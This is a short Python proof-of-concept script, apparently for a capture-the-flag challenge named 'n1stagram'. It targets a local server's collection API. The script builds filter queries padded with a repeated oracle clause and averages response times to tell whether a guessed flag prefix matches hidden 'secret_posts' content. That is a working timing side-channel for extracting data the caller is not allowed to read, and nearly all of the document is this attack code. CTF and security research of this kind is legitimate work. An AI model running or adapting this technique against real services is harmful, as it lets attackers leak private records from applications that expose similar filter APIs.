import requests

# PoC for n1stagram
# assume the correct flag is flag{test}

baseurl = "http://127.0.0.1:1337/"
oracle = "%26%26(creator:isset!=1)"*323

def test(flag):
    url = baseurl + "api/collections/secret_posts/records?filter=(content~\""+flag+"\")%26%26((creator:isset!=1)"+oracle+")"
    response = requests.get(url)
    return response

total = 0
for i in range(120):
    r = test("flag{")
    total += r.elapsed.total_seconds()

res1 = total/120
print("Average response time for the correct content filter: ", res1)

total = 0
for i in range(120):
    r = test("flag{a")
    total += r.elapsed.total_seconds()

res2 = total/120
print("Average response time for the wrong content filter: ", res2)

total = 0
for i in range(120):
    r = test("flag{t")
    total += r.elapsed.total_seconds()

res3 = total/120
print("Average response time for the correct content filter: ", res3)

# 2ms at least
assert res1-res2 > 0.002
assert res1-res3 < 0.002
